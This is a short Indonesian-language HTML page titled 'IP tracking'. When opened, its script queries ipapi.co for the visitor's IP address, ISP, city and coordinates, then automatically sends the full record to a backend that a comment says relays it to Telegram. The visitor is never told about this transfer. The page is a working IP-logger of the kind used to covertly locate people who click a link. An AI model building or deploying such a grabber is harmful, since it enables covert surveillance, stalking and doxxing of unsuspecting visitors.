<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Pelacakan IP</title>
</head>
<body>
  <h3 id="status">ğŸ” Melacak lokasi...</h3>
  <pre id="result"></pre>

  <script>
    async function getAndSendIP() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

        const info = `
ğŸŒ Hasil Pelacakan IP

ğŸ“ IP: ${data.ip}
ğŸŒ Negara: ${data.country_name}
ğŸ™ Kota: ${data.city}, ${data.region}
ğŸ›° ISP: ${data.org}
ğŸ¢ Org: ${data.org}
âš¡ ASN: ${data.asn || "N/A"}
âŒš Zona Waktu: ${data.timezone}
ğŸ“Œ Koordinat: ${data.latitude}, ${data.longitude}

ğŸ”— https://www.google.com/maps?q=${data.latitude},${data.longitude}
        `.trim();

        document.getElementById("status").textContent = "âœ… Data berhasil diambil";
        document.getElementById("result").textContent = info;

        // Kirim data lengkap ke API agar dikirim ke Telegram
        const sendRes = await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ data }),
        });

        const sendResult = await sendRes.json();
        if (!sendResult.ok) {
          console.error("Gagal kirim ke Telegram:", sendResult);
          document.getElementById("status").textContent = "âŒ Gagal kirim ke Telegram";
        }

      } catch (err) {
        console.error("Error:", err);
        document.getElementById("status").textContent = "âŒ Gagal melacak IP";
      }
    }

    getAndSendIP();
  </script>
</body>
</html>
